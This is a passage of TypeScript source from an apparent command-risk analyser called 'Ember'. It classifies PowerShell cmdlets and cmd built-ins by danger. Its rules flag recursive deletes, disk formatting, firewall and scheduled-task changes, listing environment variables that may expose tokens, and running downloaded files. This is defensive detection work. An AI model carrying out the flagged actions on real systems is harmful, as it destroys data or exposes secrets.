reg(CMDLETS, ["publish-module", "publish-script", "publish-psresource"], h => { h.e.add("publish", "pkg.publish-ps", "Publishes a package to the registry."); });
reg(CMDLETS, ["send-mailmessage"], h => { h.e.add("publish", "send.mail", "Sends an email."); });
reg(CMDLETS, ["format-volume", "initialize-disk", "remove-partition", "clear-disk", "set-partition", "resize-partition", "new-partition"], h => { h.e.add("destroy", "disk.erase", "Erases or repartitions a disk."); });
reg(CMDLETS, ["new-netfirewallrule", "set-netfirewallprofile", "remove-netfirewallrule", "set-netfirewallrule", "disable-netfirewallrule", "enable-netfirewallrule", "set-netipaddress", "new-netipaddress", "remove-netipaddress", "set-dnsclientserveraddress", "new-netroute", "remove-netroute", "set-netadapter", "disable-netadapter", "enable-netadapter", "set-netconnectionprofile"], h => { h.e.add("system", "system.network", "Changes the firewall or network settings."); });
reg(CMDLETS, ["register-scheduledtask", "unregister-scheduledtask", "new-scheduledtask", "new-scheduledtaskaction", "new-scheduledtasktrigger", "set-scheduledtask", "enable-scheduledtask", "disable-scheduledtask"], h => {
  if (/^new-scheduledtask(action|trigger|settingsset|principal)?$/.test(h.key) && h.key !== "new-scheduledtask") return;
  h.e.add("system", "system.schedule", "Schedules something to run later or at login.");
});
reg(CMDLETS, ["new-psdrive", "mount-diskimage", "dismount-diskimage", "mount-vhd", "set-date", "set-timezone", "rename-computer", "add-computer", "remove-computer", "set-itemproperty-system"], h => {
  if (h.key === "new-psdrive") {
    // A drive on another computer's share connects and signs in there as `net use` does (review #171).
    const b = bindPs(h, { params: { Name: "v", PSProvider: "v", Root: "v", Description: "v", Scope: "v", Credential: "v", Persist: "s" }, pos: ["Name", "PSProvider", "Root"] });
    for (const r of b.named.get("Root") ?? []) if (/^[\\/]{2}/.test(r.v ?? "")) h.e.usePath(r, "list", h.sc);
    if (!h.args.some(a => /^persist$/i.test(a.param ?? ""))) return;
  }
  h.e.add("system", "system.kernel", "Changes how the system works.");
});
reg(CMDLETS, ["get-childitem-env"], () => undefined);
reg(CMDLETS, ["set-variable", "new-variable"], h => {
  const b = bindPs(h, { params: { Name: "v", Value: "v", Scope: "v", Option: "v", Visibility: "v", Description: "v", PassThru: "s", Force: "s", Include: "v", Exclude: "v" }, pos: ["Name", "Value"] });
  const name = (b.named.get("Name") ?? [])[0]?.v ?? "";
  if (/^(executioncontext|psmoduleautoloadingpreference|errorActionPreference)$/i.test(name) && /^executioncontext$/i.test(name)) h.e.unclear("unclear.execution-context", "It uses PowerShell's $ExecutionContext, which Ember can't follow.");
});

// ------------------------------------------------------------------------------------------------------------------
// cmd's built-in commands (§3.4.3, §3.5.1's cmd rows).

function cmdSwitches(h: H): { sw: Set<string>; ops: Arg[] } {
  const sw = new Set<string>();
  const ops: Arg[] = [];
  for (const a of h.args) {
    const v = a.v;
    if (v !== null && /^\/[A-Za-z?:-]+/.test(v)) { for (const s of v.slice(1).split("/")) sw.add(s.toLowerCase().split(":")[0]); continue; }
    if (v !== null && /[,;]/.test(v) && !a.raw.includes("\"")) { for (const part of v.split(/[,;]+/).filter(x => x)) ops.push({ ...a, v: part }); continue; }
    ops.push(a);
  }
  return { sw, ops };
}
reg(CMD_BUILTINS, ["del", "erase"], h => {
  const { sw, ops } = cmdSwitches(h);
  const rec = sw.has("s");
  const objs = objsOf(h, ops, rec ? "deleteTree" : "delete");
  h.e.add("destroy", "cmd.del", `Deletes ${listOf(objs)}${rec ? " in every folder below" : ""}.`, { objects: objs, widening: rec ? ["recursive"] : [], program: h.key });
});
reg(CMD_BUILTINS, ["rd", "rmdir"], h => {
  const { sw, ops } = cmdSwitches(h);
  const rec = sw.has("s");
  const objs = objsOf(h, ops, rec ? "deleteTree" : "delete");
  if (objs.some(o => o.abs !== null && /\\\$recycle\.bin(\\|$)/i.test(o.abs))) h.e.add("destroy", "trash.empty", "Empties the trash.");
  h.e.add("destroy", "cmd.rd", rec ? `Deletes ${listOf(objs)} and everything in ${objs.length > 1 ? "them" : "it"}.` : `Deletes the empty folder ${listOf(objs)}.`, { objects: objs, widening: rec ? ["recursive"] : [], program: h.key });
});
function cmdCopy(h: H): void {
  const { sw, ops } = cmdSwitches(h);
  if (ops.length === 0) return;
  const rule = h.key === "move" ? "cmd.move" : h.key === "xcopy" ? "cmd.xcopy" : h.key === "ren" || h.key === "rename" ? "cmd.ren" : "cmd.copy";
  let sources = ops.length > 1 ? ops.slice(0, -1) : ops;
  let dest: Arg = ops.length > 1 ? ops[ops.length - 1] : lit(".");
  if (rule === "cmd.ren") {
    const src = ops[0];
    const nn = ops[1];
    sources = [src];
    if (!nn) return;
    const mod = win32;
    dest = src.v !== null && nn.v !== null ? lit(mod.join(mod.dirname(src.v), nn.v)) : { v: null, raw: nn.raw, glob: false };
  }
  if (h.key === "copy" || h.key === "xcopy") sources = sources.flatMap(s => (s.v !== null && s.v.includes("+") ? s.v.split("+").filter(x => x).map(x => ({ ...s, v: x })) : [s]));
  objsOf(h, sources, h.key === "move" || rule === "cmd.ren" ? "move" : sw.has("s") || sw.has("e") ? "readTree" : "read");
  const destObj = h.e.usePath(dest, "write", h.sc);
  h.e.carryCopies(sources, destObj, h.sc, rule === "cmd.ren");
  if (destObj.abs === null) { h.e.add("destroy", rule, "Writes to a file Ember can't name.", { objects: [destObj] }); return; }
  if (sw.has("y")) h.e.add("destroy", rule, `Replaces ${destObj.text} if it exists.`, { objects: [destObj], widening: ["/y"] });
  else h.e.add("destroy", rule, `Replaces ${destObj.text} if it exists.`, { objects: [destObj], ifExists: destObj.abs });
}
reg(CMD_BUILTINS, ["copy", "move", "ren", "rename", "xcopy"], h => cmdCopy(h));
reg(CMD_BUILTINS, ["type", "dir", "tree", "more", "find", "findstr", "fc", "comp", "sort", "attrib", "where", "vol", "cls", "ver", "title", "color", "prompt", "pushd", "popd", "exit", "rem", "echo.", "verify", "break", "endlocal", "chcp", "md", "mkdir", "mklink"], h => {
  const { sw, ops } = cmdSwitches(h);
  if (h.key === "md" || h.key === "mkdir") { objsOf(h, ops, "write"); return; }
  if (h.key === "mklink") {
    const link = ops[0] ? h.e.usePath(ops[0], "write", h.sc) : null;
    if (ops[1]) h.e.usePath(ops[1], "read", h.sc);
    // A link to a download runs the download (commands-remote-c2-2).
    if (link && ops[1]) h.e.carryCopies([ops[1]], link, h.sc, true);
    return;
  }
  if (h.key === "rem" || h.key === "title" || h.key === "color" || h.key === "prompt" || h.key === "exit" || h.key === "cls" || h.key === "ver" || h.key === "verify" || h.key === "break" || h.key === "endlocal" || h.key === "chcp") return;
  if (h.key === "pushd") { NATIVE.cd(h); return; }
  if (h.key === "popd") { h.e.cdTarget = null; return; }
  if (h.key === "sort" && sw.has("o")) { h.e.unclear("unclear.cmd-sort", "Ember can't tell where sort writes."); return; }
  if (h.key === "more") { h.e.unclear("unclear.interactive", SAYS.interactive); h.e.readArgs(ops, h.sc); return; }
  if (h.key === "find" || h.key === "findstr") { h.e.readArgs(ops.slice(h.key === "find" ? 1 : 0), h.sc); return; }
  // A listing reads no file (as ls and Get-ChildItem); one Ember can't name is unclear.
  if (h.key === "dir" || h.key === "tree" || h.key === "attrib" || h.key === "where") {
    for (const o of ops) if (o.v === null) h.e.unclear("unclear.unresolved-arg", `Ember can't tell what ${h.key} lists.`);
    if (h.key !== "where") objsOf(h, ops.filter(o => o.v !== null), "list");
    h.e.listed.set(h.e.at, ops);
    return;
  }
  h.e.readArgs(ops, h.sc, { unresolvedUnclear: h.key === "type" });
});
reg(CMD_BUILTINS, ["cd", "chdir"], h => NATIVE.cd(h));
reg(CMD_BUILTINS, ["echo", "echo."], h => { textProgram(h); });
/** Windows' own variables, whose prefix listing (`set PATH`) shows nothing secret. */
const CMD_SET_PLAIN = /^(path|pathext|computername|username|userdomain|userprofile|os|processor_architecture|processor_identifier|number_of_processors|temp|tmp|homedrive|homepath|appdata|localappdata|programfiles|programdata|systemroot|systemdrive|windir|comspec|prompt|psmodulepath|public|cd|date|time|errorlevel)$/i;
reg(CMD_BUILTINS, ["set"], h => {
  const { sw, ops } = cmdSwitches(h);
  if (sw.has("p")) { h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  if (sw.has("a")) return;
  if (ops.length === 0) { h.e.add("secret", "secret.env", SAYS.env); return; }
  const text = ops.map(o => o.v ?? o.raw).join(" ");
  const eq = text.indexOf("=");
  const name = eq >= 0 ? text.slice(0, eq) : text;
  // `set NAME` lists every variable whose name starts with NAME (`set GITHUB` shows GITHUB_TOKEN): only Windows' own
  // well-known names are ordinary.
  if (eq < 0) { if (!CMD_SET_PLAIN.test(name.trim())) h.e.add("secret", "secret.env", SAYS.env); return; }
  h.e.envChanged = true;
  if (RISKY_ASSIGNMENTS.has(name.toUpperCase()) || RISKY_ASSIGNMENTS.has(name) || /^(pathext|comspec)$/i.test(name)) h.e.unclear("unclear.assignment", "It changes how commands are found or run.");
  if (commandLineSecret(text)) h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
});
reg(CMD_BUILTINS, ["path"], h => { if (h.args.length) h.e.unclear("unclear.assignment", "It changes how commands are found or run."); });
reg(CMD_BUILTINS, ["start"], h => {
  const { sw, ops } = cmdSwitches(h);
  let rest = ops;
  if (rest[0] && rest[0].raw.startsWith("\"")) rest = rest.slice(1);
  const wait = sw.has("wait") || sw.has("w");
  const target = rest[0];
  if (!target) { h.e.add("escape", "escape.background", SAYS.keepsRunning); return; }
  if (target.v !== null && /^ember:/i.test(target.v)) { h.e.refuseWith("ember.url", "input"); return; }
  if (h.e.isDownloaded(target, h.sc)) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
  const program = target.v !== null && (/\.(exe|com|bat|cmd)$/i.test(target.v) || !/[.\\/:]/.test(target.v));
  if (!wait || sw.has("b")) h.e.add("escape", program ? "escape.background" : "escape.launcher", program ? SAYS.keepsRunning : SAYS.opensProgram);
  if (program) h.e.payload(rest, h.sc, "start");
  else h.e.usePath(target, "read", h.sc);
});
reg(CMD_BUILTINS, ["assoc", "ftype"], h => { if (h.args.some(a => (a.v ?? "").includes("="))) h.e.add("system", "system.kernel", "Changes how the system works."); });
reg(CMD_BUILTINS, ["date", "time"], h => { if (!h.args.some(a => /^\/t$/i.test(a.v ?? ""))) h.e.unclear("unclear.interactive", SAYS.interactive); });
reg(CMD_BUILTINS, ["pause"], h => { h.e.unclear("unclear.interactive", SAYS.interactive); });
reg(CMD_BUILTINS, ["call", "for", "if", "goto", "setlocal", "shift"], h => {
  h.e.unclear(`unclear.cmd-${h.key}`, SAYS.unclear);
  if (h.key === "call" && h.args.length) {
    const script = h.args[0];
    if (script.v !== null && !script.v.startsWith(":")) {
      scriptName(h, script.v);
      if (h.e.isDownloaded(script, h.sc)) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
    }
    h.e.unwrap(h, h.args, "call");
  }
});
reg(CMD_BUILTINS, ["format"], h => { h.e.add("destroy", "disk.erase", "Erases or repartitions a disk."); });
reg(CMD_BUILTINS, ["timeout"], () => undefined);
